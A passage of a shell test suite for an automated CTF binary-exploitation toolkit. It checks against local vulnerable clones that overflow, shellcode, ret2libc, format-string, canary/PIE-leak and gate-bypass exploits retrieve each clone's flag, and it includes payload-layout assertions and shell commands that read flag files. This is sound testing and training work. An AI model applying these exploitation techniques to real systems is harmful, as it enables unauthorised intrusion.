  && ok "ranked canary candidate wins behind a menu" || bad "only the battery found it"
stop "$P"
# The probe must walk the scripted conversation, or a mid-walk secret is invisible to it.
P=$(srv menucanary32 34202); waitport 34202
"$PY" - 34202 <<'PYWALK' && ok "probe walks the talk steps, not just the banner" || bad "probe ignores talk"
import sys, types
sys.path.insert(0, ".")
import auto_pwn as ap
a = types.SimpleNamespace(host="127.0.0.1", port=int(sys.argv[1]), timeout=4.0, idle=0.6,
                          gate_delay=0.25, noreceive=False, talk=["Choice:=2", "=PAYLOAD"])
text = ap.banner_with_gates(a)
assert b"canary = 0x" in text, text[-120:]
PYWALK
stop "$P"

say "COMPOSITION: PIE whose code leak is hidden behind a gate"
P=$(srv gatedpie32 34101); waitport 34101
timeout 280 "$PY" solve.py 127.0.0.1 34101 --binary testbed/gatedpie32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{p13_b3h1nd_4_g4t3}" \
  && ok "PIE base recovered from a leak behind a gate" || bad "gated PIE"
stop "$P"
# PIE with NO gate must still work: the shared banner reader is on every target's path.
P=$(srv pie32 34102); waitport 34102
timeout 280 "$PY" solve.py 127.0.0.1 34102 --binary testbed/pie32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{p13_r3b4s3d}" && ok "plain PIE unaffected by the shared reader" || bad "plain PIE regressed"
stop "$P"
# Only ONE banner reader may exist, or a future gate bug reappears in a copy.
"$PY" - <<'PYONE' && ok "a single gate-aware banner reader" || bad "banner reads duplicated again"
import pathlib, re
src = pathlib.Path("auto_pwn.py").read_text()
assert src.count("def banner_with_gates(") == 1
assert "recv_idle(probe" not in src, "a private probe read came back"
PYONE

say "COMPOSITION: a build shift measured through a live gate"
P=$(srv gatedecho32 34801); waitport 34801
SH1=$(timeout 220 "$PY" verify.py --binary testbed/gatedecho32-pad --host 127.0.0.1 --port 34801 \
      2>/dev/null | grep -oE "exploit-shift [-+]?0x[0-9a-f]+" | awk '{print $2}' | head -1)
stop "$P"
[ "$SH1" = "-0x20" ] && ok "verify.py measures the shift past a gate ($SH1)" \
  || bad "shift not measured through a gate (got ${SH1:-none})"
# ...and the exploit must then LAND using that shift, which is live 5003's failure mode.
P=$(srv gatedecho32 34802); waitport 34802
timeout 220 "$PY" ret2shell.py --binary testbed/gatedecho32-pad --host 127.0.0.1 --port 34802 \
  --shift="${SH1:--0x20}" --cmd 'echo ===SHELL===; cat flags/gatedecho.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "SIT{sh1ft_m34sur3d_p4st_g4t3}" \
  && ok "shellcode lands with the measured shift, past the gate" || bad "gated shift exploit"
stop "$P"
# The un-gated pair must still measure -0x20: that is the live 5003 path.
P=$("$PY" testbed/server.py "$HERE/../sandbox/echo32" --port 34803 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 34803
timeout 220 "$PY" verify.py --binary ../sandbox/echo32-pad --host 127.0.0.1 --port 34803 2>/dev/null \
  | grep -q "exploit-shift -0x20" && ok "un-gated shift detection unaffected" \
  || bad "verify.py regressed without a gate"
stop "$P"

say "COMPOSITION: a rate limit that makes a brute arithmetically hopeless"
P=$(srv slowcanary32 34701); waitport 34701
timeout 200 "$PY" solve.py 127.0.0.1 34701 --binary testbed/slowcanary32 --run --timeout 90 \
  > /tmp/slow_row.log 2>&1
stop "$P"
grep -q "per connection" /tmp/slow_row.log \
  && ok "the per-connection cost is measured and reported" || bad "rate limit not reported"
grep -qE "needs about [0-9]+ connections .* = [0-9]+ min" /tmp/slow_row.log \
  && ok "a hopeless brute is costed in minutes, not just attempted" || bad "no brute cost estimate"
# A banner printed AFTER a pause must still be read, or triage judges a silent socket.
P=$(srv slowcanary32 34702); waitport 34702
timeout 120 "$PY" solve.py 127.0.0.1 34702 --binary testbed/slowcanary32 --timeout 60 2>/dev/null \
  | grep -q "Slow Vault" && ok "a banner behind a 1.2s pause is still read" \
  || bad "read_banner gives up before a slow banner"
stop "$P"
# NEGATIVE: a fast service must not be warned off a brute that genuinely finishes.
# Tested as ARITHMETIC, not by running a 1024-connection brute inside this suite:
# canaryfork32 infers survival from timing and must run alone (see testbed/launch.sh),
# so an end-to-end row here flakes under the suite's own load - which it promptly did.
# The decision is what matters and it is deterministic.
"$PY" - <<'PYCOST' && ok "cost arithmetic warns only when a brute cannot fit" || bad "brute cost logic"
import sys
sys.path.insert(0, ".")
import solve
fast = solve.brute_estimate("ret2win (canary brute)", 0.02)     # a quick forking service
slow = solve.brute_estimate("ret2win (canary brute)", 1.22)     # slowcanary32, measured
assert fast and slow, (fast, slow)
assert fast[1] < 240, fast        # fits a normal budget -> must NOT warn
assert slow[1] > 240, slow        # 21 min -> must warn
assert solve.brute_estimate("ret2win", 1.22) is None   # not a brute at all
assert solve.brute_estimate("ret2win (PIE partial overwrite)", 0.02)[0] == 128
PYCOST

say "COMPOSITION: ret2shellcode behind a live gate"
P=$(srv gatedshell32 34601); waitport 34601
O=$(timeout 200 "$PY" ret2shell.py --binary testbed/gatedshell32 --host 127.0.0.1 --port 34601 \
      --cmd 'echo ===SHELL===; cat flags/gatedshell.txt' 2>&1 | tr -d '\0')
stop "$P"
echo "$O" | grep -q "SIT{sh3llc0d3_p4st_4_g4t3}" \
  && ok "shellcode lands after the gate is answered" || bad "ret2shellcode behind a gate"
echo "$O" | grep -q "a live gate was answered" \
  && ok "the gate was answered automatically, no flag needed" || bad "gate not auto-answered"
# A clone with NO gate must be untouched - and asserted with its OWN flag file, because
# the shared flags/ directory means a globbing --cmd can return any clone's flag.
P=$("$PY" testbed/server.py "$HERE/../sandbox/h5_shell32" --port 34602 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 34602
timeout 200 "$PY" ret2shell.py --binary ../sandbox/h5_shell32 --host 127.0.0.1 --port 34602 \
  --cmd 'echo ===SHELL===; cat flags/h5.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "FLAG{h3ld_0ut_5_sh3ll_shift}" && ok "un-gated shellcode + build shift intact" \
  || bad "ret2shell regressed without a gate"
stop "$P"

say "COMPOSITION: ret2libc behind a menu (two stages, two walks)"
P=$(srv menulibc32 34501); waitport 34501
timeout 400 "$PY" solve.py 127.0.0.1 34501 --binary testbed/menulibc32 --run --timeout 340 \
  > /tmp/ml_route.log 2>&1
grep -q "SIT{r3t2l1bc_b3h1nd_m3nu}" /tmp/ml_route.log \
  && ok "libc leak survives a menu on BOTH stages" || bad "ret2libc behind a menu"
stop "$P"
# ret2libc with NO obstacle must be untouched: the walk is only added when one exists.
P=$(srv ret2libc32 34502); waitport 34502
timeout 280 "$PY" ret2libc.py 127.0.0.1 34502 --binary testbed/ret2libc32 \
  --cmd 'echo ===SHELL===; cat flags/libc.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "SIT{r3t2l1bc_ch41n}" && ok "plain ret2libc unaffected" || bad "plain ret2libc regressed"
stop "$P"
# A menu walk must not wrap tools that cannot take --talk: those candidates can never
# work and cost a full cap each (four dead 25s slots on menulibc32).
"$PY" - <<'PYTALK' && ok "menu walk only wraps --talk-capable tools" || bad "dead menu candidates"
import pathlib
src = pathlib.Path("solve.py").read_text()
assert 'if not any("auto_pwn.py" in x for x in c["cmd"]):' in src
PYTALK

say "COMPOSITION: a login gate in front of a per-connection canary"
P=$(srv logincanary32 34401); waitport 34401
timeout 280 "$PY" solve.py 127.0.0.1 34401 --binary testbed/logincanary32 --run --timeout 220 \
  > /tmp/lc_route.log 2>&1
grep -q "SIT{l0g1n_pluS_c4n4ry}" /tmp/lc_route.log \
  && ok "canary read after logging in, then spliced" || bad "login+canary composition"
grep -q "SOLVED via ret2win (canary leaked) after login" /tmp/lc_route.log \
  && ok "ranked canary candidate wins behind a login" || bad "only the battery found it"
stop "$P"
# ANY obstacle hides the banner, not just a menu: a credential prompt must count too.
"$PY" - <<'PYHID' && ok "menu and login both count as a hidden banner" || bad "hidden_banner too narrow"
import re, pathlib
src = pathlib.Path("solve.py").read_text()
assert "hidden_banner = menu_in_way or cred_in_way" in src
assert "canary_leaked or hidden_banner" in src
PYHID

say "COMPOSITION: a login gate AND the overflow on a later read"
P=$(srv loginread32 34001); waitport 34001
timeout 280 "$PY" solve.py 127.0.0.1 34001 --binary testbed/loginread32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{l0g1n_th3n_s3c0nd_r34d}" \
  && ok "login walk and later-read walk chain together" || bad "walkers do not compose"
stop "$P"
# The single walk must still handle each shape ALONE, or unifying them was a regression.
P=$(srv login32 34002); waitport 34002
timeout 280 "$PY" solve.py 127.0.0.1 34002 --binary testbed/login32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{l0g1n_fr0m_r0d4t4}" && ok "login alone still works" || bad "login alone regressed"
stop "$P"
P=$(srv tworead32 34003); waitport 34003
timeout 280 "$PY" solve.py 127.0.0.1 34003 --binary testbed/tworead32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{s3c0nd_r34d_w1ns}" && ok "later read alone still works" || bad "later read regressed"
stop "$P"

say "COMPOSITION: a live gate in front of a per-connection secret"
P=$(srv gatedcanary32 33901); waitport 33901
timeout 280 "$PY" solve.py 127.0.0.1 33901 --binary testbed/gatedcanary32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{g4t3_pluS_c4n4ry}" \
  && ok "gate answered AND canary spliced from the same connection" || bad "gate+canary composition"
stop "$P"
# The canary probe must look past the gate, or it decides there is no canary at all.
P=$(srv gatedcanary32 33902); waitport 33902
timeout 60 "$PY" solve.py 127.0.0.1 33902 --binary testbed/gatedcanary32 2>/dev/null \
  | grep -q "ret2win (canary leaked)" \
  && ok "triage sees the canary that is hidden behind the gate" || bad "canary hidden by gate"
stop "$P"
# NEGATIVE: a crash must not be mistaken for the service rejecting our padding byte.
"$PY" - <<'PYREJ' && ok "a crash is not read as an input rejection" || bad "crash read as rejection"
import sys
sys.path.insert(0, ".")
from auto_pwn import REJECTED, CRASHED
for crash in (b"*** stack smashing detected ***: terminated",
              b"Segmentation fault (core dumped)"):
    assert CRASHED.search(crash), crash
    assert not (REJECTED.search(crash) and not CRASHED.search(crash)), crash
assert REJECTED.search(b"rejected: capital A detected")
assert not CRASHED.search(b"rejected: capital A detected")
PYREJ

say "anti-script boxes and live gates"
P=$(srv alarm32 31100); waitport 31100
timeout 280 "$PY" solve.py 127.0.0.1 31100 --binary testbed/alarm32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{b34t_th3_4l4rm}" && ok "alarm(3): the process dies mid-scan" || bad "alarm32"
stop "$P"
P=$(srv decoywin32 31101); waitport 31101
timeout 280 "$PY" solve.py 127.0.0.1 31101 --binary testbed/decoywin32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{r34l_w1nn3r_p1ck3d}" && ok "two win-like symbols, one a trap" || bad "decoywin32"
stop "$P"
P=$(srv fixedread32 31102); waitport 31102
timeout 280 "$PY" solve.py 127.0.0.1 31102 --binary testbed/fixedread32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{r4w_r34d_n0_n3wl1n3}" && ok "raw read(), no newline semantics" || bad "fixedread32"
stop "$P"
P=$(srv randbanner32 31103); waitport 31103
timeout 280 "$PY" solve.py 127.0.0.1 31103 --binary testbed/randbanner32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{b4nn3r_1ndep3nd3nt}" && ok "banner differs on every connection" || bad "randbanner32"
stop "$P"
P=$(srv scanfnum32 31104); waitport 31104
timeout 280 "$PY" solve.py 127.0.0.1 31104 --binary testbed/scanfnum32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{num3r1c_g4t3_p4ss3d}" && ok "numeric prompt before the overflow" || bad "scanfnum32"
stop "$P"
P=$(srv filtered32 31105); waitport 31105
timeout 280 "$PY" solve.py 127.0.0.1 31105 --binary testbed/filtered32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{f1lt3r_d0dg3d}" && ok "service rejects the letter A" || bad "filtered32"
stop "$P"
P=$(srv toupper32 31106); waitport 31106
timeout 280 "$PY" solve.py 127.0.0.1 31106 --binary testbed/toupper32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{t0upp3r_surv1v3d}" && ok "input is upper-cased before the copy" || bad "toupper32"
stop "$P"
P=$(srv gated32 31107); waitport 31107
timeout 280 "$PY" solve.py 127.0.0.1 31107 --binary testbed/gated32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{l1v3_g4t3s_4nsw3r3d}" && ok "ANTI-SCRIPT BOX: arithmetic + nonce + too-fast" || bad "gated32"
stop "$P"
# The gate answerer must stay silent on ordinary prompts, or every normal target breaks.
"$PY" - <<'PYGATE' && ok "gate answerer ignores ordinary prompts" || bad "gate answerer false positive"
import sys
sys.path.insert(0, ".")
from auto_pwn import answer_gate
for quiet in (b"Enter your name:\n", b"message: ", b"Say something: ",
              b"1) register 2) quit\nChoice:",
              b"buffer: 0x7fff3113dd60\nsaved RIP: 0x7fff3113dd88\n"):
    assert answer_gate(quiet) is None, quiet
assert answer_gate(b"what is 7 + 8 ?") == b"15"
assert answer_gate(b"echo this token back: deadbeef\n") == b"deadbeef"
PYGATE

say "service shape: later reads, neighbours, wrong bounds, login gates"
P=$(srv tworead32 32800); waitport 32800
timeout 280 "$PY" solve.py 127.0.0.1 32800 --binary testbed/tworead32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{s3c0nd_r34d_w1ns}" && ok "overflow is on the SECOND read, not the first" || bad "tworead32"
stop "$P"
P=$(srv fnptr32 32801); waitport 32801
timeout 280 "$PY" solve.py 127.0.0.1 32801 --binary testbed/fnptr32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{fn_p0int3r_r3d1r3ct}" && ok "adjacent neighbour is a function pointer" || bad "fnptr32"
stop "$P"
P=$(srv strncpy32 32802); waitport 32802
timeout 280 "$PY" solve.py 127.0.0.1 32802 --binary testbed/strncpy32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{strncpy_wr0ng_b0und}" && ok "strncpy with the destination's wrong size" || bad "strncpy32"
stop "$P"
P=$(srv login32 32803); waitport 32803
timeout 280 "$PY" solve.py 127.0.0.1 32803 --binary testbed/login32 --run --timeout 220 2>/dev/null \
  | grep -q "SIT{l0g1n_fr0m_r0d4t4}" && ok "password gate: credentials out of .rodata" || bad "login32"
stop "$P"

say "shellcode vs the input function"
P=$(srv scanfshell32 32850); waitport 32850
O=$(timeout 120 "$PY" ret2shell.py --binary testbed/scanfshell32 --host 127.0.0.1 --port 32850 \
      --cmd 'echo ===SHELL===; cat flags/scanfshell.txt' 2>&1 | tr -d '\0')
stop "$P"
echo "$O" | grep -q "SIT{sh3llc0d3_n0_wh1t3sp4c3}" \
  && ok "scanf sink: clean shellcode chosen automatically" || bad "scanf shellcode"
echo "$O" | grep -q "sending in line mode" \
  && ok "send mode derived from the sink" || bad "send mode not derived"
# NEGATIVE: the default shellcode carries 0x0b, which scanf eats. It must NOT win here.
P=$(srv scanfshell32 32851); waitport 32851
timeout 120 "$PY" ret2shell.py --binary testbed/scanfshell32 --host 127.0.0.1 --port 32851 \
  --shellcode-file /dev/stdin --cmd 'echo ===SHELL===; cat flags/scanfshell.txt' \
  </dev/null 2>/dev/null | tr -d '\0' | grep -q "SIT{" \
  && bad "empty shellcode should not have worked" || ok "empty shellcode correctly fails"
stop "$P"
# The read() service must still get raw mode and the standard shellcode.
P=$("$PY" testbed/server.py "$HERE/../sandbox/h5_shell32" --port 32852 --cwd "$HERE/../sandbox" >/dev/null 2>&1 & echo $!)
waitport 32852
timeout 120 "$PY" ret2shell.py --binary ../sandbox/h5_shell32 --host 127.0.0.1 --port 32852 \
  --cmd 'echo ===SHELL===; cat flags/h5.txt' 2>/dev/null | tr -d '\0' \
  | grep -q "FLAG{h3ld_0ut_5_sh3ll_shift}" && ok "read() service keeps raw mode" || bad "raw mode regressed"
stop "$P"

say "drill.sh: the blind practice harness runs and cleans up"
# Non-interactive: feed it Enter so it reveals immediately. This only checks the harness
# itself - that it serves a random clone, names it afterwards, and leaves nothing behind.
echo "" | timeout 120 bash drill.sh 1 hard > /tmp/drill_gate.log 2>&1
grep -qE "target : 127\.0\.0\.1 [0-9]+" /tmp/drill_gate.log \
  && ok "drill serves a random target on a free port" || bad "drill did not serve a target"
grep -qE "it was: [a-z0-9_-]+" /tmp/drill_gate.log \
  && ok "drill reveals which clone it was" || bad "drill never revealed the answer"
[ -z "$(ls /tmp/drill_target_* 2>/dev/null)" ] \
  && ok "drill leaves no target copies behind" || bad "drill left temp binaries"
grep -qE "its flag: ((SIT|FLAG|flag)\{|one of flags/)" /tmp/drill_gate.log \
  && ok "drill reveals the target's own flag" || bad "drill did not show the expected flag"
[ -z "$(ls -d /tmp/drill_dir_* 2>/dev/null)" ] \
  && ok "drill leaves no per-target flag directory behind" || bad "drill left a flag directory"

# =====================================================================================
# 21 Nov 2026, round 3: the format-string family beyond "32-bit, address printed for
# you", and the buffer-overflow guards the magic-constant scan could not see. Every clone
# below was exploited BY HAND first and FAILED in the toolkit before its fix (see bof.md,
# "Round 3"). Each row asserts that clone's OWN flag, never just "a flag".
# =====================================================================================
sv(){ # sv <clone> <port> <flag> <label> [timeout]
  local P; P=$(srv "$1" "$2"); waitport "$2"
  timeout "${5:-150}" "$PY" solve.py 127.0.0.1 "$2" --binary "testbed/$1" --run 2>/dev/null \
    | tr -d '\0' | grep -qF "$3" && ok "$4" || bad "$4"
  stop "$P"
}

say "DECISIONS: what the analysis derives, before any exploit runs"
"$PY" - <<'PYDEC' && ok "frame guards / fmt targets / GOT order derived correctly" || bad "a derivation is wrong (see above)"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap, fmtpwn as fp
T = "testbed/"
def plans(n, **kw): return ap.frame_guard_plans(T + n, **kw)
fails = []
def check(cond, msg):
    if not cond:
        fails.append(msg); print("   DECISION WRONG:", msg)
# a char guard: one byte, value 0x37, 8 bytes in
p = plans("adjchar32")
check(p and p[0][1] == b"A" * 8 + b"7", f"adjchar32 first plan {p[:1]}")
# exact small value, below the old 0x100 floor
p = plans("adjone32")
check(p and p[0][1] == b"A" * 40 + b"\x01\x00\x00\x00", f"adjone32 {p[:1]}")
# two fields in ONE payload
p = plans("varpair32")
check(p and p[0][1].endswith(bytes.fromhex("bebafecadec0adde")), f"varpair32 {p[:1]}")
# `if (!f)` on a FILE* inside the flag printer is NOT a guard
check(not any("show" in l or "win " in l for l, _ in plans("adjbool32")), "show()/win() FILE* test taken for a guard")
check(not plans("menu32") and not plans("canary32"), "plans invented where there is no guard")
# a struct MEMBER addressed as lea+add is at its own offset, not the struct's start
p = plans("adjcmd32")
check(p and p[0][1].startswith(b"A" * 32) and b"cat " in p[0][1], f"adjcmd32 {p[:1]}")
# a sink that stops on NUL still gets `== 1`: trailing zeros dropped, not the plan
p = plans("adjone32", bad=b"\x00")
check(p and p[0][1] == b"A" * 40 + b"\x01", f"adjone32 with NUL forbidden {p[:1]}")
# format string: guard value read through the 32-bit GOT base, not guessed
e, rep = fp.load_elf(T + "fmtnonzero32"); txt = fp.disasm(T + "fmtnonzero32")
gp = next(s["addr"] for s in e.sections if s["name"] == ".got.plt")
check(fp.guard_values(txt, rep["data_symbols"]["target"], gp)[:2] == [1, 0], "fmtnonzero32 guard values")
e, rep = fp.load_elf(T + "fmtsmall32"); txt = fp.disasm(T + "fmtsmall32")
gp = next(s["addr"] for s in e.sections if s["name"] == ".got.plt")
check(fp.guard_values(txt, rep["data_symbols"]["target"], gp)[:1] == [0x64], "fmtsmall32 guard value")
# GOT order: a function called after printf first; what win() itself needs last
e, rep = fp.load_elf(T + "fmtgotwin32"); txt = fp.disasm(T + "fmtgotwin32")
order = fp.got_order(fp.functions_text(txt), rep["got"], set(rep["win_symbols"]))
check(order[0] in ("puts", "exit") and order.index("fopen") > order.index("exit") and order.index("printf") > order.index("exit"), f"got order {order}")
# 64-bit write: nothing but the tail may hold a NUL, and the tail is the addresses
cx = fp.Ctx(None, 64, 6, 0, 255)
pl = cx.write_payload(cx.split(0x404050, 0xDEADBEEF, 4, 2))
check(b"\x00" not in pl[:pl.index(b"\x50\x40\x40")] and pl.endswith(b"\x52\x40\x40\x00\x00\x00\x00\x00"), "64-bit payload layout")
# small value: the count before the first %hn must be able to be < 8
pl = cx.write_payload([(0x404050, 1, 2)])
check(pl.startswith(b"%1c%"), f"small-value layout {pl[:12]}")
sys.exit(1 if fails else 0)
PYDEC

say "FORMAT STRING: reads the old scan could not finish or could not express"
sv nameecho32  35228 "SIT{sh3llc0d3_4ft3r_th3_n4m3}" "shellcode (jmp esp) when a harmless Name prompt comes first and the offset is the frame's second"
sv namelibc32  35229 "SIT{l1bc_4ft3r_th3_n4m3}" "ret2libc when a harmless Name prompt comes first and the offset is the frame's second"
sv namebuf32   35230 "SIT{buff3r_4ddr_4ft3r_th3_n4m3}" "shellcode at a buffer address printed only after a harmless Name prompt"
sv floodguard64 35240 "SIT{b0th_s1d3s_0f_th3_c0mp4r3}" "run-time secret never printed: one byte repeated equalises both sides"
sv fmtsecret32  35001 "SIT{l4b_4tt4ck1_p01nt3r_0n_st4ck}" "lab Attack 1: %s through a stack pointer at slot 39"
sv fmtsecret64  35002 "SIT{p01nt3r_0n_st4ck_64}"          "same, 64-bit"
sv fmtglobal32  35003 "SIT{gl0b4l_r34d_32}"               "flag in a global: address in the payload, 32-bit"
sv fmtglobal64  35004 "SIT{gl0b4l_r34d_4ddr_4t_t41l}"     "flag in a global: address after the format, 64-bit"

say "FORMAT STRING: writes with nothing printed for you"
sv fmtsmall32   35011 "SIT{sm4ll_v4lu3_n33ds_t41l_4ddr}"  "exact small value 0x64 (under the old 0x100 floor)"
sv fmttarget64  35012 "SIT{hn_wr1t3_64b1t}"               "exact %hn write on 64-bit"
sv fmtnonzero32 35013 "SIT{n0nz3r0_32_p1c}"               "if (target): value from the test, 32-bit PIC"
sv fmtnonzero64 35014 "SIT{4ny_n0nz3r0_w1ll_d0}"          "if (target): 64-bit"
sv fmtprefix32  35015 "SIT{pr3f1x_c0unts_t0w4rds_n}"      "prefix printed by the same printf is counted"
sv fmtshort32   35016 "SIT{23_byt3s_0n3_hn}"              "23-byte buffer: measured, single %hn chosen"
sv fmtgotwin32  35017 "SIT{g0t_t0_w1n_n0_l34k}"           "GOT -> win with no leak, 32-bit"
sv fmtgotwin64  35018 "SIT{g0t_t0_w1n_64}"                "GOT -> win with no leak, 64-bit"

say "FORMAT STRING then OVERFLOW: the leak is the first input, the use is the second"
sv fmtcanary32  35021 "SIT{fmt_l34ks_c4n4ry_th3n_b0f}"    "canary leaked through printf, 32-bit"
sv fmtcanary64  35022 "SIT{fmt_c4n4ry_64}"                "canary leaked through printf, 64-bit"
sv fmtpie32     35023 "SIT{fmt_l34ks_p13_b4s3}"           "PIE base leaked through printf, 32-bit"
sv fmtpie64     35024 "SIT{fmt_p13_64}"                   "PIE base leaked through printf, 64-bit"
sv fmtboth64    35025 "SIT{c4n4ry_4nd_p13_0n3_l34k}"      "canary AND PIE from one format string"

say "OVERFLOW GUARDS read from the stack frame (offset + width + value together)"
sv adjchar32    35031 "SIT{l4b_4tt4ck2_ch4r_gu4rd}"       "lab Attack 2: a char guard"
sv adjbool32    35032 "SIT{4uth3nt1c4t3d_n0nz3r0}"        "if (authenticated): no constant exists"
sv adjbool64    35033 "SIT{4uth3nt1c4t3d_64}"             "same, 64-bit"
sv adjone32     35034 "SIT{l3v3l_must_b3_3x4ctly_1}"      "level == 1: exact value under 0x100"
sv varpair32    35035 "SIT{tw0_f13lds_0n3_p4yl04d}"       "two-field guard in one payload"
sv adjmem32     35036 "SIT{strncmp_0n_th3_n31ghb0ur}"     "neighbouring string compared with strncmp"
sv adjcmd32     35037 "SIT{0v3rwr1t3_th3_c0mm4nd}"        "neighbouring command buffer run by system()"

say "win() is a SHELL, and shellcode at a printed buffer address"
sv shellwin32   35041 "SIT{w1n_1s_4_sh3ll_typ3_c4t}"      "ret2win into system(/bin/sh): the flag is typed for"
sv shellwin64   35042 "SIT{sh3ll_w1n_64_4l1gn3d}"         "same on 64-bit: realigned at the derived offset first"
sv bufleak32    35043 "SIT{l4b_n0p_sl3d_buff3r_4ddr}"     "lab layout: NOP sled in the buffer, address from the banner"
sv bufleak64    35044 "SIT{buff3r_4ddr_64}"               "same, 64-bit"
sv bufsmall32   35045 "SIT{sh3llc0d3_4ft3r_th3_r3t}"      "16-byte buffer: shellcode placed after the return address"

say "FORMAT STRING as an oracle, a shell behind the GOT, and guards behind other sinks"
sv fmtguess32    35061 "SIT{l34k_th3_numb3r_s4y_1t_b4ck}"  "random number leaked and answered in the same connection"
sv fmtguess64    35062 "SIT{h1gh_h4lf_0f_th3_w0rd}"        "same on 64-bit: the secret is the HIGH half of its slot"
sv fmtpass32     35063 "SIT{p4ssw0rd_r34d_0ff_th3_st4ck}"  "password read off the stack as text and typed back"
sv fmtgotshell32 35064 "SIT{g0t_t0_4_sh3ll_w1n}"           "GOT -> win where win is a shell"
sv varscanf32    35065 "SIT{sc4nf_gu4rd_3x4ct_0n3}"        "level == 1 through scanf: trailing zeros left to the sink"
sv varstrcpy32   35066 "SIT{th3_c0py_1s_th3_0v3rfl0w}"     "guard in the frame of the strcpy, not of the read"

say "SOURCE ONLY (how live 5001 shipped): guards derived from chall.c, no binary"
ss(){ # ss <clone> <port> <flag> <label>   - solve.py with --source and NO --binary
  local P; P=$(srv "$1" "$2"); waitport "$2"
  timeout 150 "$PY" solve.py 127.0.0.1 "$2" --source "testbed/src/$1.c" --run 2>/dev/null \
    | tr -d '\0' | grep -qF "$3" && ok "$4" || bad "$4"
  stop "$P"
}
"$PY" - <<'PYSRC' && ok "struct layout and guard values read from the C source" || bad "source guard derivation"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap
def first(n, bits=32): return ap.source_guard_plans(f"testbed/src/{n}.c", bits)[0][1]
bad = []
def check(c, m):
    if not c: bad.append(m); print("   DECISION WRONG:", m)
check(first("varsrc") == b"A" * 32 + bytes.fromhex("dec03713"), "varsrc: access_code at +32")
check(first("adjchar32") == b"A" * 8 + b"7", "adjchar32: char member at +8, value from a char literal")
check(first("varpair32").endswith(bytes.fromhex("bebafecadec0adde")), "varpair32: both members, one payload")
check(first("adjmem32") == b"A" * 24 + b"root", "adjmem32: neighbouring string")
# two declarations sharing one `;`-separated line must both be seen
check(len(ap._c_decls(";char buf[32]; int level;", 32)) == 2, "declarations on one line")
# a FILE* tested with if (!f) is not a guard
check(not any("f " in l for l, _ in ap.source_guard_plans("testbed/src/menu32.c")), "FILE* taken for a guard")
sys.exit(1 if bad else 0)
PYSRC
ss adjone32   35071 "SIT{l3v3l_must_b3_3x4ctly_1}"   "source only: level == 1"
ss adjchar32  35072 "SIT{l4b_4tt4ck2_ch4r_gu4rd}"    "source only: char guard"
ss varpair32  35073 "SIT{tw0_f13lds_0n3_p4yl04d}"    "source only: two-field guard"
ss adjcmd32   35074 "SIT{0v3rwr1t3_th3_c0mm4nd}"     "source only: neighbouring command buffer"
ss locone64   35075 "SIT{l0c4ls_n0t_4_struct_spr4y}" "source only: separate locals, value sprayed"
sv locone64   35076 "SIT{l0c4ls_n0t_4_struct_spr4y}" "same clone from the binary: exact offset from the frame"
sv locstr32   35077 "SIT{l0c4l_r0l3_b3c0m3s_r00t}"   "neighbouring local string compared with strcmp"

say "ANTI-SCRIPT (round 5): values that exist only on the wire, gates, disguised flags"
"$PY" - <<'PYR5' && ok "run-time guards, flag decoding and bad-byte address splitting derived correctly" || bad "a round-5 derivation is wrong"
import sys
sys.path.insert(0, ".")
import auto_pwn as ap, fmtpwn as fp, flags as fl
bad = []
def check(c, m):
    if not c: bad.append(m); print("   DECISION WRONG:", m)
# a guard compared with a VARIABLE is dynamic: one field, 32 in, 4 wide - and no static plan
ap.frame_guard_plans("testbed/randguard32")
check([(d[1], d[2]) for d in ap.frame_guard_plans.dynamic] == [(32, 4)], f"randguard32 dynamic {ap.frame_guard_plans.dynamic}")
ap.source_guard_plans("testbed/src/randguard32.c")
check([(d[1], d[2]) for d in ap.source_guard_plans.dynamic] == [(32, 4)], "randguard32 dynamic from source")
# ...and constant guards must NOT be mistaken for dynamic ones
for n in ("varsrc", "var64", "adjone32", "varpair32", "canary32", "login32"):
    ap.frame_guard_plans("testbed/" + n)
    check(not ap.frame_guard_plans.dynamic, f"{n}: a constant guard was called run-time")
check(ap.win_wants_runtime_arg("testbed/randarg32"), "randarg32: win(key) vs a run-time key")
check(not any(ap.win_wants_runtime_arg("testbed/" + n) for n in ("winarg64", "twoarg32", "strarg64", "shellwin32")),
      "a constant-argument win() was called run-time")
# numbers from a banner: code addresses are not values to write
check(ap.banner_numbers(b"Session code: 0x1a2b3c4d, visitor #4821, win at 0x8049216", "testbed/menu32") == [0x1a2b3c4d, 4821],
      "banner numbers")
# THE WRONG-FLAG BUG: a long hex run is one string, not little-endian stack words
h = "SIT{pr1nt3d_4s_h3x_n0t_l0st}".encode().hex()
check(fl.decode_and_find("reward (hex): " + h, strong_only=True) == ("SIT{pr1nt3d_4s_h3x_n0t_l0st}", "hex-encoded"),
      f"hex-encoded flag -> {fl.decode_and_find('reward (hex): ' + h, strong_only=True)}")
check(fl.decode_and_find("x }dlr0w_0ll3h{TIS x", strong_only=True)[0] == "SIT{h3ll0_w0rld}", "reversed flag")
check(fl.decode_and_find("U0lUe2gzbGwwX3cwcmxkfQ==", strong_only=True)[0] == "SIT{h3ll0_w0rld}", "base64 flag")
check(fl.decode_and_find("FVG{u3yy0_j0eyq}", strong_only=True)[0] == "SIT{h3ll0_w0rld}", "rot13 flag")
# the Echo Chamber shape must still decode little-endian
check(fl.decode_and_find("Hello, 6d7230667b544953 6e697274355f7440 7d7367 0 0", strong_only=True)[0] == "SIT{f0rm@t_5trings}",
